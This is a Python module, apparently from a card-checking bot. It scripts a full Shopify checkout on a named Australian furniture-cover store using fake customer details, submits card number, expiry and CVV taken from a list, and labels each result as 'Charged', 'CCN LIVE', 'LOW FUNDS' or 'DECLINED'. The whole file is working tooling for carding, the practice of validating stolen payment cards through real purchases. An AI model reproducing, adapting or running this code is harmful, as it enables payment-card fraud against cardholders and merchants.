import os
import time
from .rand_user import random_user_api
from ..filters.checker_defs import find_between

def one(r):
    a = r.get('https://dressyourspace.com.au/collections/outdoor-furniture-covers/products/fire-pit-cover-various-sizes-outdoor-furniture-dys-covers')
    b_data = {
'id': '27998497669185',
'option-0': '66cm sq. x 40cm drop.',
'quantity': '1',
'add': '',
}

    b = r.post('https://dressyourspace.com.au/cart/add', data = b_data)
    if b.status_code != 200: return False
    d_post = {
'updates[]': '1',
'note': '',
'checkout': 'Checkout',
}

    d = r.post('https://dressyourspace.com.au/cart', d_post)
    # with open('d.html', 'w', encoding='utf-8') as wr: wr.write(d.text)
    # sho_auth= find_between(d.text, 'name="shopify-checkout-authorization-token" content="', '"')
    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')
    # checkout_id= find_between(d.text,'"checkoutToken":"','"')
    url = d.url
    return (auth_token, url) if auth_token else False




def two(r,url,auth_token, rand_user):
    e_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'contact_information',
'step': 'shipping_method',
'checkout[email]': rand_user.email,
'checkout[pick_up_in_store][selected]': 'false',
'checkout[id]': 'delivery-shipping',
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '3 allen street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'New York',
'checkout[shipping_address][country]': 'US',
'checkout[shipping_address][province]': 'New York',
'checkout[shipping_address][zip]': '10002',
'checkout[shipping_address][phone]': rand_user.phone,
'checkout[shipping_address][country]': 'Australia',
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '39 Hummocky Road',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'Cassini',
'checkout[shipping_address][province]': 'SA',
'checkout[shipping_address][zip]': '5223',
'checkout[shipping_address][phone]': rand_user.phone,
'checkout[client_details][browser_width]': '615',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    e = r.post(url, data = e_data)
    if e.status_code != 200:
        return False
    ee = r.get(url + '/shipping_rates?step=shipping_method')
    if ee.status_code != 200:
        return False
    f_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'shipping_method',
'step': 'payment_method',
'checkout[shipping_rate][id]': 'Better Shipping App-BetterShipping-South%20Australia%20Shipping-22.95',
'checkout[client_details][browser_width]': '632',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    g = r.post(url, data = f_data)
    if g.status_code != 200:
        return False
    h = r.get(g.url)
    if h.status_code != 200:
        return False
    payment_gateway = find_between(h.text,'data-subfields-for-gateway="','"')
    return False if not payment_gateway else payment_gateway


def three(r, payment_gateway, lista, rand_user,auth_token, url):
    cc,mes,ano,cvv = lista
    json_four = {
    "credit_card": {
        "number": cc,
        "name": rand_user.name,
        "month": mes,
        "year": ano,
        "verification_value": cvv
    },
    "payment_session_scope": "dressyourspace.com.au"
}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return False
    g_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'payment_method',
'step': '',
's': four.json()['id'],
'checkout[payment_gateway]': payment_gateway,
'checkout[credit_card][vault]': 'false',
'checkout[different_billing_address]': 'false',
'checkout[remember_me]': 'false',
'checkout[remember_me]': '0',
'checkout[vault_phone]': rand_user.phone,
'checkout[total_price]': '4595',
'complete': '1',
'checkout[client_details][browser_width]': '615',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    g = r.post(url, data = g_data)
    if g.status_code != 200:
        return False
    time.sleep(4)
    h = r.get(g.url + '?from_processing_page=1')
    if h.status_code != 200:
        return False
    i = r.get(h.url + '&validate=true')
    if i.status_code != 200:
        return False
    return i.text



def get_response_shc(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $46", "✅", 'Charged'
        return r_text, r_logo, r_respo,
    text1 = find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if 'ZIP code does not match billing address' in text or "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif "Security code was not matched by the processor" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $46", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo